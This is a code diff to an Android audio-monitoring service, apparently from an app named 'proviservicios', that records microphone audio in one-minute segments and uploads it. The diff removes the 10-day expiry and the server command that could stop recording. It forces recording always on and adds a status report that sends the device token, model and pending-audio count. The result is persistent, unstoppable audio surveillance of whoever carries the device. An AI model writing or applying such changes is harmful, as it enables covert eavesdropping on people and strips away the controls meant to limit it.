@@ -18,14 +18,11 @@ import android.os.IBinder;
 import android.os.Looper;
 import android.content.pm.ServiceInfo;
 
-import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
@@ -36,27 +33,21 @@ public class MonitoringService extends Service {
     private static final String CHANNEL_ID = "proviservicios_monitor";
     private static final int NOTIFICATION_ID = 88;
     private static final long SEGMENT_MS = 60L * 1000L;
-    private static final long ACTIVE_MS = 10L * 24L * 60L * 60L * 1000L;
 
     private final Handler handler = new Handler(Looper.getMainLooper());
     private MediaRecorder recorder;
     private File currentFile;
     private long currentStartedAt;
     private SharedPreferences prefs;
-    private boolean desiredRecording = false;
+    private boolean desiredRecording = true;
     private String serviceState = "alive";
     private String serviceMessage = "Servicio activo";
     private final Runnable workRunnable = new Runnable() {
         @Override
         public void run() {
-            if (isExpired()) {
-                desiredRecording = false;
-                stopRecording();
-                stopSelf();
-                return;
-            }
-            pollCommandAsync();
+            desiredRecording = true;
             reconcileRecording();
+            reportStateAsync();
             uploadPendingAsync();
             scheduleWork(15000);
         }
@@ -95,7 +86,7 @@ public class MonitoringService extends Service {
     }
 
     private boolean isExpired() {
-        return System.currentTimeMillis() - prefs.getLong("started_at", System.currentTimeMillis()) > ACTIVE_MS;
+        return false;
     }
 
     private void scheduleWork(long delay) {
@@ -124,48 +115,46 @@ public class MonitoringService extends Service {
         }
     }
 
-    private void pollCommandAsync() {
+    private void reportStateAsync() {
         new Thread(() -> {
             try {
-                boolean enabled = fetchRecordingCommand();
-                desiredRecording = enabled;
-                handler.post(() -> reconcileRecording());
+                sendState();
             } catch (Exception ignored) {
             }
         }).start();
     }
 
-    private boolean fetchRecordingCommand() throws Exception {
-        String body = "device_uuid=" + encode(prefs.getString("device_uuid", ""))
-                + "&device_token=" + encode(prefs.getString("device_token", ""))
-                + "&device_label=" + encode(Build.MANUFACTURER + " " + Build.MODEL)
-                + "&service_state=" + encode(serviceState)
-                + "&service_message=" + encode(serviceMessage);
+    private void sendState() throws Exception {
         HttpURLConnection conn = (HttpURLConnection) new URL(APP_URL + "monitor_command.php").openConnection();
         conn.setConnectTimeout(10000);
         conn.setReadTimeout(15000);
         conn.setDoOutput(true);
         conn.setRequestMethod("POST");
-        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=PROVISTATE");
         DataOutputStream out = new DataOutputStream(conn.getOutputStream());
-        out.writeBytes(body);
+        writeStateField(out, "device_uuid", prefs.getString("device_uuid", ""));
+        writeStateField(out, "device_token", prefs.getString("device_token", ""));
+        writeStateField(out, "device_label", Build.MANUFACTURER + " " + Build.MODEL);
+        writeStateField(out, "service_state", serviceState);
+        writeStateField(out, "service_message", serviceMessage);
+        writeStateField(out, "pending_audio_count", String.valueOf(pendingAudioCount()));
+        out.writeBytes("--PROVISTATE--\r\n");
         out.flush();
         out.close();
-        int code = conn.getResponseCode();
-        BufferedReader reader = new BufferedReader(new InputStreamReader(
-                code >= 200 && code < 300 ? conn.getInputStream() : conn.getErrorStream()
-        ));
-        StringBuilder response = new StringBuilder();
-        String line;
-        while ((line = reader.readLine()) != null) response.append(line);
-        reader.close();
+        conn.getResponseCode();
         conn.disconnect();
-        String json = response.toString();
-        return json.contains("\"recording_enabled\":true") || json.contains("\"recording_enabled\":1");
     }
 
-    private String encode(String value) throws Exception {
-        return URLEncoder.encode(value == null ? "" : value, "UTF-8");
+    private void writeStateField(DataOutputStream out, String name, String value) throws Exception {
+        out.writeBytes("--PROVISTATE\r\n");
+        out.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n");
+        out.writeBytes((value == null ? "" : value) + "\r\n");
+    }
+
+    private int pendingAudioCount() {
+        File dir = new File(getFilesDir(), "monitor_audio");
+        File[] files = dir.listFiles((file) -> file.getName().endsWith(".m4a") && file.length() > 1024 && !(file.equals(currentFile) && recorder != null));
+        return files == null ? 0 : files.length;
     }
 
     private void startRecording() {
@@ -225,7 +214,10 @@ public class MonitoringService extends Service {
     private void rotateRecording() {
         stopRecording();
         uploadPendingAsync();
-        if (!isExpired() && desiredRecording) startRecording();
+        if (!isExpired()) {
+            desiredRecording = true;
+            startRecording();
+        }
     }
 
     private void stopRecording() {
@@ -239,8 +231,8 @@ public class MonitoringService extends Service {
         } catch (Exception ignored) {
         }
         recorder = null;
-        serviceState = "alive";
-        serviceMessage = "Servicio activo sin grabar";
+        serviceState = desiredRecording ? "rotating" : "alive";
+        serviceMessage = desiredRecording ? "Cambiando segmento de audio" : "Servicio activo sin grabar";
         beginForeground();
     }
 
